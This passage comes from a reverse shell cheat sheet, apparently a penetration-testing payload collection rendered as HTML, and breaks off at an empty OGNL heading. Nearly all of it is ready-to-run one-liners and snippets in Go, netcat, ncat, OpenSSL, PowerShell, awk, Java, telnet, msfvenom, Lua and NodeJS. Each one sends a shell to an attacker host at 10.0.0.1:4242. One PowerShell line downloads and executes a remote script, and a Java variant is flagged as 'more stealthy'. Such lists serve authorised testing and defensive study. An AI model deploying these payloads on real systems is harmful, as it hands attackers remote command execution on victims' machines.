<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;package main;import&quot;os/exec&quot;;import&quot;net&quot;;func main(){c,_:=net.Dial(&quot;tcp&quot;,&quot;10.0.0.1:4242&quot;);cmd:=exec.Command(&quot;/bin/sh&quot;);cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>/tmp/t.go<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>go<span class="w"> </span>run<span class="w"> </span>/tmp/t.go<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>rm<span class="w"> </span>/tmp/t.go
</code></pre></div>
<h3 id="netcat-traditional">Netcat Traditional</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>nc<span class="w"> </span>-e<span class="w"> </span>/bin/sh<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span><span class="m">4242</span>
<a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>nc<span class="w"> </span>-e<span class="w"> </span>/bin/bash<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span><span class="m">4242</span>
<a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>nc<span class="w"> </span>-c<span class="w"> </span>bash<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span><span class="m">4242</span>
</code></pre></div>
<h3 id="netcat-openbsd">Netcat OpenBsd</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>rm<span class="w"> </span>-f<span class="w"> </span>/tmp/f<span class="p">;</span>mkfifo<span class="w"> </span>/tmp/f<span class="p">;</span>cat<span class="w"> </span>/tmp/f<span class="p">|</span>/bin/sh<span class="w"> </span>-i<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">|</span>nc<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span><span class="m">4242</span><span class="w"> </span>&gt;/tmp/f
</code></pre></div>
<h3 id="netcat-busybox">Netcat BusyBox</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>rm<span class="w"> </span>-f<span class="w"> </span>/tmp/f<span class="p">;</span>mknod<span class="w"> </span>/tmp/f<span class="w"> </span>p<span class="p">;</span>cat<span class="w"> </span>/tmp/f<span class="p">|</span>/bin/sh<span class="w"> </span>-i<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">|</span>nc<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span><span class="m">4242</span><span class="w"> </span>&gt;/tmp/f
</code></pre></div>
<h3 id="ncat">Ncat</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>ncat<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span><span class="m">4242</span><span class="w"> </span>-e<span class="w"> </span>/bin/bash
<a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>ncat<span class="w"> </span>--udp<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span><span class="m">4242</span><span class="w"> </span>-e<span class="w"> </span>/bin/bash
</code></pre></div>
<h3 id="openssl">OpenSSL</h3>
<p>Attacker:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="n">user</span><span class="nv">@attack</span><span class="p">$</span> <span class="n">openssl</span> <span class="n">req</span> <span class="n">-x509</span> <span class="n">-newkey</span> <span class="n">rsa</span><span class="p">:</span><span class="n">4096</span> <span class="n">-keyout</span> <span class="n">key</span><span class="p">.</span><span class="n">pem</span> <span class="n">-out</span> <span class="n">cert</span><span class="p">.</span><span class="n">pem</span> <span class="n">-days</span> <span class="n">365</span> <span class="n">-nodes</span>
<a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="n">user</span><span class="nv">@attack</span><span class="p">$</span> <span class="n">openssl</span> <span class="n">s_server</span> <span class="n">-quiet</span> <span class="n">-key</span> <span class="n">key</span><span class="p">.</span><span class="n">pem</span> <span class="n">-cert</span> <span class="n">cert</span><span class="p">.</span><span class="n">pem</span> <span class="n">-port</span> <span class="n">4242</span>
<a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a><span class="n">or</span>
<a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="n">user</span><span class="nv">@attack</span><span class="p">$</span> <span class="n">ncat</span> <span class="p">-</span><span class="n">-ssl</span> <span class="n">-vv</span> <span class="n">-l</span> <span class="n">-p</span> <span class="n">4242</span>
<a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a>
<a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a><span class="n">user</span><span class="nv">@victim</span><span class="p">$</span> <span class="n">mkfifo</span> <span class="p">/</span><span class="n">tmp</span><span class="p">/</span><span class="n">s</span><span class="p">;</span> <span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">sh</span> <span class="n">-i</span> <span class="p">&lt;</span> <span class="p">/</span><span class="n">tmp</span><span class="p">/</span><span class="n">s</span> <span class="n">2</span><span class="p">&gt;&amp;</span><span class="n">1</span> <span class="p">|</span> <span class="n">openssl</span> <span class="n">s_client</span> <span class="n">-quiet</span> <span class="n">-connect</span> <span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span><span class="p">:</span><span class="n">4242</span> <span class="p">&gt;</span> <span class="p">/</span><span class="n">tmp</span><span class="p">/</span><span class="n">s</span><span class="p">;</span> <span class="nb">rm </span><span class="p">/</span><span class="n">tmp</span><span class="p">/</span><span class="n">s</span>
</code></pre></div>
<p>TLS-PSK (does not rely on PKI or self-signed certificates)</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="c1"># generate 384-bit PSK</span>
<a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="c1"># use the generated string as a value for the two PSK variables from below</span>
<a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>openssl<span class="w"> </span>rand<span class="w"> </span>-hex<span class="w"> </span><span class="m">48</span><span class="w"> </span>
<a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a><span class="c1"># server (attacker)</span>
<a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a><span class="nb">export</span><span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="s2">&quot;*&quot;</span><span class="p">;</span><span class="w"> </span><span class="nb">export</span><span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="s2">&quot;4242&quot;</span><span class="p">;</span><span class="w"> </span><span class="nb">export</span><span class="w"> </span><span class="nv">PSK</span><span class="o">=</span><span class="s2">&quot;replacewithgeneratedpskfromabove&quot;</span><span class="p">;</span><span class="w"> </span>openssl<span class="w"> </span>s_server<span class="w"> </span>-quiet<span class="w"> </span>-tls1_2<span class="w"> </span>-cipher<span class="w"> </span>PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256<span class="w"> </span>-psk<span class="w"> </span><span class="nv">$PSK</span><span class="w"> </span>-nocert<span class="w"> </span>-accept<span class="w"> </span><span class="nv">$LHOST</span>:<span class="nv">$LPORT</span>
<a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a><span class="c1"># client (victim)</span>
<a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a><span class="nb">export</span><span class="w"> </span><span class="nv">RHOST</span><span class="o">=</span><span class="s2">&quot;10.0.0.1&quot;</span><span class="p">;</span><span class="w"> </span><span class="nb">export</span><span class="w"> </span><span class="nv">RPORT</span><span class="o">=</span><span class="s2">&quot;4242&quot;</span><span class="p">;</span><span class="w"> </span><span class="nb">export</span><span class="w"> </span><span class="nv">PSK</span><span class="o">=</span><span class="s2">&quot;replacewithgeneratedpskfromabove&quot;</span><span class="p">;</span><span class="w"> </span><span class="nb">export</span><span class="w"> </span><span class="nv">PIPE</span><span class="o">=</span><span class="s2">&quot;/tmp/`openssl rand -hex 4`&quot;</span><span class="p">;</span><span class="w"> </span>mkfifo<span class="w"> </span><span class="nv">$PIPE</span><span class="p">;</span><span class="w"> </span>/bin/sh<span class="w"> </span>-i<span class="w"> </span>&lt;<span class="w"> </span><span class="nv">$PIPE</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>openssl<span class="w"> </span>s_client<span class="w"> </span>-quiet<span class="w"> </span>-tls1_2<span class="w"> </span>-psk<span class="w"> </span><span class="nv">$PSK</span><span class="w"> </span>-connect<span class="w"> </span><span class="nv">$RHOST</span>:<span class="nv">$RPORT</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nv">$PIPE</span><span class="p">;</span><span class="w"> </span>rm<span class="w"> </span><span class="nv">$PIPE</span>
</code></pre></div>
<h3 id="powershell">Powershell</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="n">powershell</span> <span class="n">-NoP</span> <span class="n">-NonI</span> <span class="n">-W</span> <span class="n">Hidden</span> <span class="n">-Exec</span> <span class="n">Bypass</span> <span class="n">-Command</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">Sockets</span><span class="p">.</span><span class="n">TCPClient</span><span class="p">(</span><span class="s2">&quot;10.0.0.1&quot;</span><span class="p">,</span><span class="n">4242</span><span class="p">);</span><span class="nv">$stream</span> <span class="p">=</span> <span class="nv">$client</span><span class="p">.</span><span class="n">GetStream</span><span class="p">();</span><span class="no">[byte[]]</span><span class="nv">$bytes</span> <span class="p">=</span> <span class="n">0</span><span class="p">..</span><span class="n">65535</span><span class="p">|%{</span><span class="n">0</span><span class="p">};</span><span class="k">while</span><span class="p">((</span><span class="nv">$i</span> <span class="p">=</span> <span class="nv">$stream</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$bytes</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="o">-ne</span> <span class="n">0</span><span class="p">){;</span><span class="nv">$data</span> <span class="p">=</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">.</span><span class="n">ASCIIEncoding</span><span class="p">).</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="n">0</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span><span class="nv">$sendback</span> <span class="p">=</span> <span class="p">(</span><span class="nb">iex </span><span class="nv">$data</span> <span class="n">2</span><span class="p">&gt;&amp;</span><span class="n">1</span> <span class="p">|</span> <span class="nb">Out-String</span> <span class="p">);</span><span class="nv">$sendback2</span>  <span class="p">=</span> <span class="nv">$sendback</span> <span class="p">+</span> <span class="s2">&quot;PS &quot;</span> <span class="p">+</span> <span class="p">(</span><span class="n">pwd</span><span class="p">).</span><span class="n">Path</span> <span class="p">+</span> <span class="s2">&quot;&gt; &quot;</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="p">=</span> <span class="p">(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="n">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="n">Flush</span><span class="p">()};</span><span class="nv">$client</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="n">powershell</span> <span class="n">-nop</span> <span class="n">-c</span> <span class="s2">&quot;$client = New-Object System.Net.Sockets.TCPClient(&#39;10.0.0.1&#39;,4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="n">powershell</span> <span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1&#39;</span><span class="p">)</span>
</code></pre></div>
<h3 id="awk">Awk</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="n">awk</span> <span class="s1">&#39;BEGIN {s = &quot;/inet/tcp/0/10.0.0.1/4242&quot;; while(42) { do{ printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != &quot;exit&quot;) close(s); }}&#39;</span> <span class="p">/</span><span class="n">dev</span><span class="p">/</span><span class="n">null</span>
</code></pre></div>
<h3 id="java">Java</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="n">Runtime</span><span class="w"> </span><span class="n">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">();</span>
<a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="n">Process</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="na">exec</span><span class="p">(</span><span class="s">&quot;/bin/bash -c &#39;exec 5&lt;&gt;/dev/tcp/10.0.0.1/4242;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&#39;&quot;</span><span class="p">);</span>
<a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a><span class="n">p</span><span class="p">.</span><span class="na">waitFor</span><span class="p">();</span>
</code></pre></div>
<h4 id="java-alternative-1">Java Alternative 1</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="n">String</span><span class="w"> </span><span class="n">host</span><span class="o">=</span><span class="s">&quot;127.0.0.1&quot;</span><span class="p">;</span>
<a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="kt">int</span><span class="w"> </span><span class="n">port</span><span class="o">=</span><span class="mi">4444</span><span class="p">;</span>
<a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="o">=</span><span class="s">&quot;cmd.exe&quot;</span><span class="p">;</span>
<a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a><span class="n">Process</span><span class="w"> </span><span class="n">p</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">ProcessBuilder</span><span class="p">(</span><span class="n">cmd</span><span class="p">).</span><span class="na">redirectErrorStream</span><span class="p">(</span><span class="kc">true</span><span class="p">).</span><span class="na">start</span><span class="p">();</span><span class="n">Socket</span><span class="w"> </span><span class="n">s</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">Socket</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">);</span><span class="n">InputStream</span><span class="w"> </span><span class="n">pi</span><span class="o">=</span><span class="n">p</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">(),</span><span class="n">pe</span><span class="o">=</span><span class="n">p</span><span class="p">.</span><span class="na">getErrorStream</span><span class="p">(),</span><span class="w"> </span><span class="n">si</span><span class="o">=</span><span class="n">s</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">();</span><span class="n">OutputStream</span><span class="w"> </span><span class="n">po</span><span class="o">=</span><span class="n">p</span><span class="p">.</span><span class="na">getOutputStream</span><span class="p">(),</span><span class="n">so</span><span class="o">=</span><span class="n">s</span><span class="p">.</span><span class="na">getOutputStream</span><span class="p">();</span><span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="n">s</span><span class="p">.</span><span class="na">isClosed</span><span class="p">()){</span><span class="k">while</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="na">available</span><span class="p">()</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span><span class="n">so</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="na">read</span><span class="p">());</span><span class="k">while</span><span class="p">(</span><span class="n">pe</span><span class="p">.</span><span class="na">available</span><span class="p">()</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span><span class="n">so</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">pe</span><span class="p">.</span><span class="na">read</span><span class="p">());</span><span class="k">while</span><span class="p">(</span><span class="n">si</span><span class="p">.</span><span class="na">available</span><span class="p">()</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span><span class="n">po</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">si</span><span class="p">.</span><span class="na">read</span><span class="p">());</span><span class="n">so</span><span class="p">.</span><span class="na">flush</span><span class="p">();</span><span class="n">po</span><span class="p">.</span><span class="na">flush</span><span class="p">();</span><span class="n">Thread</span><span class="p">.</span><span class="na">sleep</span><span class="p">(</span><span class="mi">50</span><span class="p">);</span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="n">p</span><span class="p">.</span><span class="na">exitValue</span><span class="p">();</span><span class="k">break</span><span class="p">;}</span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">){}};</span><span class="n">p</span><span class="p">.</span><span class="na">destroy</span><span class="p">();</span><span class="n">s</span><span class="p">.</span><span class="na">close</span><span class="p">();</span>
</code></pre></div>
<h4 id="java-alternative-2">Java Alternative 2</h4>
<p><strong>NOTE</strong>: This is more stealthy</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="n">Thread</span><span class="w"> </span><span class="n">thread</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Thread</span><span class="p">(){</span>
<a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">run</span><span class="p">(){</span>
<a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a><span class="w">        </span><span class="c1">// Reverse shell here</span>
<a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a><span class="w">    </span><span class="p">}</span>
<a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a><span class="p">}</span>
<a id="__codelineno-40-6" name="__codelineno-40-6" href="#__codelineno-40-6"></a><span class="n">thread</span><span class="p">.</span><span class="na">start</span><span class="p">();</span>
</code></pre></div>
<h3 id="telnet">Telnet</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>In<span class="w"> </span>Attacker<span class="w"> </span>machine<span class="w"> </span>start<span class="w"> </span>two<span class="w"> </span>listeners:
<a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>nc<span class="w"> </span>-lvp<span class="w"> </span><span class="m">8080</span>
<a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a>nc<span class="w"> </span>-lvp<span class="w"> </span><span class="m">8081</span>
<a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a>
<a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a>In<span class="w"> </span>Victime<span class="w"> </span>machine<span class="w"> </span>run<span class="w"> </span>below<span class="w"> </span>command:
<a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a>telnet<span class="w"> </span>&lt;Your_IP&gt;<span class="w"> </span><span class="m">8080</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>/bin/sh<span class="w"> </span><span class="p">|</span><span class="w"> </span>telnet<span class="w"> </span>&lt;Your_IP&gt;<span class="w"> </span><span class="m">8081</span>
</code></pre></div>
<h3 id="war">War</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="n">msfvenom</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="n">java</span><span class="o">/</span><span class="n">jsp_shell_reverse_tcp</span><span class="w"> </span><span class="n">LHOST</span><span class="o">=</span><span class="mf">10.0.0.1</span><span class="w"> </span><span class="n">LPORT</span><span class="o">=</span><span class="mi">4242</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="n">war</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">reverse</span><span class="p">.</span><span class="na">war</span>
<a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a><span class="n">strings</span><span class="w"> </span><span class="n">reverse</span><span class="p">.</span><span class="na">war</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="n">jsp</span><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">order</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">get</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">file</span>
</code></pre></div>
<h3 id="lua">Lua</h3>
<p>Linux only</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="n">lua</span> <span class="n">-e</span> <span class="s2">&quot;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;10.0.0.1&#39;,&#39;4242&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;</span>
</code></pre></div>
<p>Windows and Linux</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="n">lua5</span><span class="p">.</span><span class="n">1</span> <span class="n">-e</span> <span class="s1">&#39;local host, port = &quot;10.0.0.1&quot;, 4242 local socket = require(&quot;socket&quot;) local tcp = socket.tcp() local io = require(&quot;io&quot;) tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, &quot;r&quot;) local s = f:read(&quot;*a&quot;) f:close() tcp:send(s) if status == &quot;closed&quot; then break end end tcp:close()&#39;</span>
</code></pre></div>
<h3 id="nodejs">NodeJS</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
<a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a><span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">net</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">&quot;net&quot;</span><span class="p">),</span>
<a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a><span class="w">        </span><span class="nx">cp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">&quot;child_process&quot;</span><span class="p">),</span>
<a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a><span class="w">        </span><span class="nx">sh</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">cp</span><span class="p">.</span><span class="nx">spawn</span><span class="p">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">[]);</span>
<a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a><span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">net</span><span class="p">.</span><span class="nx">Socket</span><span class="p">();</span>
<a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a><span class="w">    </span><span class="nx">client</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="mf">4242</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;10.0.0.1&quot;</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="p">(){</span>
<a id="__codelineno-45-7" name="__codelineno-45-7" href="#__codelineno-45-7"></a><span class="w">        </span><span class="nx">client</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">sh</span><span class="p">.</span><span class="nx">stdin</span><span class="p">);</span>
<a id="__codelineno-45-8" name="__codelineno-45-8" href="#__codelineno-45-8"></a><span class="w">        </span><span class="nx">sh</span><span class="p">.</span><span class="nx">stdout</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
<a id="__codelineno-45-9" name="__codelineno-45-9" href="#__codelineno-45-9"></a><span class="w">        </span><span class="nx">sh</span><span class="p">.</span><span class="nx">stderr</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
<a id="__codelineno-45-10" name="__codelineno-45-10" href="#__codelineno-45-10"></a><span class="w">    </span><span class="p">});</span>
<a id="__codelineno-45-11" name="__codelineno-45-11" href="#__codelineno-45-11"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="sr">/a/</span><span class="p">;</span><span class="w"> </span><span class="c1">// Prevents the Node.js application from crashing</span>
<a id="__codelineno-45-12" name="__codelineno-45-12" href="#__codelineno-45-12"></a><span class="p">})();</span>
<a id="__codelineno-45-13" name="__codelineno-45-13" href="#__codelineno-45-13"></a>
<a id="__codelineno-45-14" name="__codelineno-45-14" href="#__codelineno-45-14"></a>
<a id="__codelineno-45-15" name="__codelineno-45-15" href="#__codelineno-45-15"></a><span class="nx">or</span>
<a id="__codelineno-45-16" name="__codelineno-45-16" href="#__codelineno-45-16"></a>
<a id="__codelineno-45-17" name="__codelineno-45-17" href="#__codelineno-45-17"></a><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;nc -e /bin/sh 10.0.0.1 4242&#39;</span><span class="p">)</span>
<a id="__codelineno-45-18" name="__codelineno-45-18" href="#__codelineno-45-18"></a>
<a id="__codelineno-45-19" name="__codelineno-45-19" href="#__codelineno-45-19"></a><span class="nx">or</span>
<a id="__codelineno-45-20" name="__codelineno-45-20" href="#__codelineno-45-20"></a>
<a id="__codelineno-45-21" name="__codelineno-45-21" href="#__codelineno-45-21"></a><span class="o">-</span><span class="kd">var</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">global</span><span class="p">.</span><span class="nx">process</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span>
<a id="__codelineno-45-22" name="__codelineno-45-22" href="#__codelineno-45-22"></a><span class="o">-</span><span class="nx">x</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;nc 10.0.0.1 4242 -e /bin/bash&#39;</span><span class="p">)</span>
<a id="__codelineno-45-23" name="__codelineno-45-23" href="#__codelineno-45-23"></a>
<a id="__codelineno-45-24" name="__codelineno-45-24" href="#__codelineno-45-24"></a><span class="nx">or</span>
<a id="__codelineno-45-25" name="__codelineno-45-25" href="#__codelineno-45-25"></a>
<a id="__codelineno-45-26" name="__codelineno-45-26" href="#__codelineno-45-26"></a><span class="nx">https</span><span class="o">:</span><span class="c1">//gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py</span>
</code></pre></div>
<h3 id="ognl">OGNL</h3>
